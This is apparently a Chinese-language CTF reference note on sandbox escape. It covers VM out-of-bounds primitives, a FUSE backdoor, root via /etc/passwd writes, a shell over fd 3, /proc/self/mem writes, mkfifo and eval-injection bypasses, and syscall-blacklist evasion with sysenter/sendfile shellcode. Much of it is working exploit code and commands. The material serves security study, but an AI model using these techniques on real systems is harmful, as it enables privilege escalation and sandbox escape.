# 沙箱逃逸与受限环境

seccomp 的过滤绕过见 [[binary/漏洞利用/Pwn 进阶手法.md|Pwn 进阶]] §1；内核侧沙箱（namespace、capability）见 [[binary/漏洞利用/内核保护绕过.md|内核绕过]]；pyjail 见 [[misc/沙箱逃逸/Python 沙箱逃逸.md|pyjail]]、bash 受限环境见 [[misc/沙箱逃逸/Bash 沙箱与受限 shell 逃逸.md|bashjail]]。

## 0. 判据速查

| 观察到的现象 | 绕过点 | 去哪节 |
|---|---|---|
| 自定义 VM 有 `inspect`/`write_byte` 类指令 | 越界读写对象结构体 | §2 |
| 有 FUSE/CUSE 设备（`cuse_lowlevel_main`） | 设备写处理器里的命令解析 | §3 |
| 有任意文件写 + 任意偏移 | 写 `/proc/self/mem`，绕过页保护 | §6 |
| 沙箱用 `process_vm_readv` 校验路径 | 造只读映射让校验失败 | §7 |
| 先 `stat` 查大小再 `read` | `mkfifo` 报 size=0 但能给任意数据 | §8 |
| 游戏逻辑里两次百分比扣减 | 整数下溢，负库存换钱 | §9 |
| 模拟器用 `eval` 处理输出转义 | 闭合引号注入 Python | §10 |
| Unicorn 只 hook 了 `int 0x80` | 换 `sysenter`；换等价 syscall | §11 |
| VM 的 `swap` 没校验栈索引 | 让 `sp` 指向自己，自改写 | §12 |
| 有命令执行但没回连 | 重定向到 fd 3（已有连接） | §5 |

**总原则**：沙箱代码的 bug 不在「检查逻辑写错」，而在**检查失败时的分支没被处理**。`process_vm_readv` 返回失败、`stat` 报 0、`eval` 抛异常 —— 这些路径往往直接放行。

## 1. Python 沙箱

## 2. 自定义 VM 的越界原语

**形态**：带寄存器、操作码、syscall 的 VM，保护全开（Full RELRO + NX + PIE）。

常见的两类 VM syscall 缺陷：

```text
inspect(obj, offset) / write_byte(obj, offset, val)
  → 没有边界检查，可读写对象结构体之外的数据

name(obj, length)
  → 直接写对象结构体，length 可控时溢出到相邻字段
```

利用路径：

```text
1. 分配两个对象（data + exec）
2. 用越界 inspect 读 exec 对象的 XOR 编码函数指针 → 泄漏 PIE 基址
3. 用 name 溢出改写 exec 指针为 win() ^ KEY
4. execute(obj) 解码并调用被改过的指针
```

**判据**：VM 的「对象」是宿主内存里的真实结构体，任何以 offset 为参数的指令都要测越界。

## 3. FUSE / CUSE 字符设备

FUSE（用户态文件系统）/ CUSE（用户态字符设备）把处理逻辑放在用户态，但**以守护进程的权限运行**。

**识别**：

```text
cuse_lowlevel_main() / fuse_main() 调用
包含 open / read / write 处理器的操作结构体
DEVNAME=backdoor 之类的设备名注册
```

**典型后门形态**：

```c
void backdoor_write(const char *input, size_t len) {
    char *cmd  = strtok(input, ":");
    char *file = strtok(NULL, ":");
    char *mode = strtok(NULL, ":");
    if (!strcmp(cmd, "b4ckd00r")) {
        chmod(file, atoi(mode));      // 任意 chmod
    }
}
```

```bash
# 通过自定义设备改 /etc/passwd 权限
echo "b4ckd00r:/etc/passwd:511" > /dev/backdoor    # 511 = 0777

# 去掉 root 的口令
echo "root::0:0:root:/root:/bin/sh" > /etc/passwd
su root
```

**要点**：`511` 是十进制，`atoi` 不认 `0777` 这种八进制写法。这是最容易搞错的地方。

## 4. 受限 shell 提权

没有 sudo 时，找可写的系统文件或自定义设备：

```text
目标文件：/etc/passwd、/etc/shadow、/etc/sudoers
/etc/passwd   → 删掉 root 的口令哈希（第二个字段留空）
/etc/sudoers  → 加一条 NOPASSWD
```

**任何对 `/etc/passwd` 或 `/etc/sudoers` 的写原语都等于 root。**

## 5. Shell 技巧：不需要回连

网络服务通常把客户端连接放在 **fd 3**。直接重定向即可，无需反弹 shell：

```bash
exec <&3; sh >&3 2>&3
# 极简版
exec<&3;sh>&3
```

```bash
ls -la /proc/self/fd     # 确认哪个 fd 是 socket
```

**优势**：绕过出网防火墙；在字符受限的场景下更短；不需要额外监听端口。

## 6. 通过 `/proc/self/mem` 任意写

服务提供「任意文件 + 任意偏移 + 任意内容」的写接口时，直接打 `/proc/self/mem`：

```python
from pwn import *

def write_mem(r, offset, data):
    r.sendline(b'/proc/self/mem')
    r.sendline(str(offset).encode())
    r.sendline(data)

shellcode = asm(shellcraft.sh())
r = remote(host, port)
write_mem(r, target_code_addr, shellcode)
```

**为什么能绕过页保护**：`/proc/self/mem` 通过页表直接写，不受 mmap 的 `PROT_READ` 限制。等价于调试器的 `PTRACE_POKETEXT`。**只读的代码段也能改。**

前提：写接口要能传二进制（含 NULL 字节），且偏移是有效的已映射虚拟地址。

## 7. `process_vm_readv` 失败即绕过

**形态**：沙箱用 `process_vm_readv()` 读沙箱进程的路径字符串，再做 `realpath()` 校验。

```c
// 用只读映射放路径字符串（PROT_READ，但 supervisor 读不到）
mmap(0x13370000, 0x1000, PROT_READ, MAP_FIXED|MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
// supervisor 的 process_vm_readv 失败 → 校验直接跳过
// realpath() 也失败 → 检查整个绕过
// 之后 open("/flag") 畅通
```

**核心**：沙箱假设「校验要么成功、要么拒绝」，但**失败分支没处理**。沙箱进程自己能读自己的内存，supervisor 不能。

## 8. `mkfifo` 绕过大小检查

程序先 `stat` 查大小再读时，命名管道永远报 `st_size = 0`：

```bash
mkfifo /tmp/payload_pipe
cat exploit_data > /tmp/payload_pipe &      # 后台喂数据
./vulnerable_binary /tmp/payload_pipe       # 看到 size=0，跳过检查，读入任意长度
```

**判据**：任何「先 `stat` 预分配或校验，再 `read`」的实现都可疑。

**配套技巧**：`ln -s /flag arena.c` —— 用二进制里已有的字符串当目标文件名，省掉往 ROP 链里塞字符串的空间。

## 9. 游戏逻辑整数下溢

两次独立的百分比扣减作用在同一变量上，且不合并检查总和：

```lua
inventory = inventory - math.floor(inventory * 0.10)   -- 先扣 10%
inventory = inventory - math.floor(inventory * 1.00)   -- 再扣 100%，归零
```

```text
如果顺序反过来，或合并计算：
  100% 衰减 → 0
  10% of 0 = 0 → 总扣减 100%，不下溢

但顺序执行且不封顶：
  第一步：inventory -= inventory * decay_rate   （100% → 0）
  第二步：inventory -= extra_penalty            （对 0 再减 → 负数）
  结果：inventory = -penalty_amount             （回绕成大正数或被当成负价卖出）
```

```text
利用：
1. 找到游戏循环里两个独立的扣减事件（回合衰减 + 交易惩罚）
2. 在同一 tick 内触发，中间不封顶
3. 确认库存变负（可能显示成巨大数字或 0 + 负债）
4. 卖负库存：价格 × 负数 → 负总价，或回绕成巨额正数 → 无限金钱
5. 用无限金钱买 flag
```

**判据**：任何对同一整数施加多次独立百分比修正的游戏机制。**没有任何内存破坏，纯粹是业务逻辑。**

## 10. 模拟器 `eval` 注入

**形态**：CPU 模拟器的 PRINT 指令用 `eval('"' + string_buffer + '"')` 处理转义序列。

```python
from pwn import *

ADD, PRINT = 0x01, 0x58

def build_char(c):
    return bytes([ADD, current_mem_ptr(), ord(c)])

injection = '''"+__import__("os").system("cat /flag")#'''

program = b"".join(build_char(c) for c in injection)
program += bytes([PRINT, 0x00])
```

最终 `eval` 的内容变成：

```python
eval('""+__import__("os").system("cat /flag")#"')
```

`"` 闭合字符串字面量，`#` 注释掉尾部多余的引号。

**核心**：模拟器信任自己内存里的内容，但内存内容由攻击者用普通指令写入。

## 11. Unicorn syscall 黑名单绕过

**形态**：基于 Unicorn 的 shellcode 运行器 hook 了 `UC_HOOK_INSN` 的 `int 0x80`，拦掉 `execve`/`read`/`write`/`mmap`。

**两个绕过方向**：

### 11.1 换入口指令

`sysenter` 走快速入口，Unicorn 的 `INT` hook **不会触发**。其他入口：`syscall`（x86-64）、`int 0x2e`（部分 32 位测试构建）。

### 11.2 换等价 syscall

```text
dup2    → dup3
open    → openat
read    → pread64
write   → sendfile / writev
mmap    → mmap2
```

```asm
; 用 sendfile 把 /flag 直接送到 stdout，完全不碰 read/write
mov eax, 0x123            ; __NR_openat
mov ebx, -100             ; AT_FDCWD
lea ecx, [flag_path]
xor edx, edx
sysenter                  ; 不是 int 0x80，绕过 Unicorn 的 INT hook

; eax 现在是 fd
mov ebx, eax              ; src fd
mov ecx, 1                ; dst fd = stdout
xor edx, edx              ; offset NULL
mov esi, 0x1000           ; count
mov eax, 0xbb             ; __NR_sendfile
sysenter
```

**`sendfile` 是最值得记的一个**：它把文件描述符内容直接搬到另一个 fd，全程不经过 `read`/`write`，几乎所有黑名单都会漏掉它。

## 12. VM 的 `swap` 自改写

**形态**：VM 的 `swap(a, b)` 指令按相对保存的 `sp` 的索引读两个栈槽，但**没校验 `sp_nxt` 是否在界内**。

```text
swap(-1, 0)     # 把 &sp_nxt 当成 stack[-1]，与 stack[0] 交换
# 交换后 sp_nxt 指向 stack[0] 原来的位置 → 之后的写落到任意地址
```

```text
串起来：
1. swap(-1, 0) 让 sp_nxt 指向攻击者可控的位置
2. push 把 shellcode 字节写到新指针处
3. 把 VM 派发表里的函数指针改成 shellcode 地址
```

**判据**：任何能重写自身状态指针的 VM 原语，都是直接的任意写。**优先测栈指针本身是否可寻址**（负索引、超大索引）。

## 13. 纪律

- **沙箱的漏洞在「失败分支」**。`process_vm_readv` 失败、`stat` 返回 0、`eval` 抛异常 —— 这些路径常直接放行。
- **`/proc/self/mem` 无视页保护**。只读代码段也能改，等价 `PTRACE_POKETEXT`。
- **`mkfifo` 的 size 永远是 0**。任何先 `stat` 再 `read` 的实现都可疑。
- **syscall 黑名单一定漏**。`sendfile`、`openat`、`dup3`、`pread64`、`mmap2` 是高频漏网。
- **`int 0x80` 被 hook 就换 `sysenter`/`syscall`**。指令级过滤只看具体 opcode。
- **VM 原语优先测边界**。负索引、超大索引、`sp` 自身可寻址 —— 一处命中就是任意写。
- **有命令执行先看 fd 3**。已有连接的重定向比反弹 shell 稳，还绕防火墙。
- **`atoi` 不认八进制**。`0777` 要写成 `511`。
- **游戏逻辑题不要找内存破坏**。整数下溢、负库存、回绕，全在业务层。
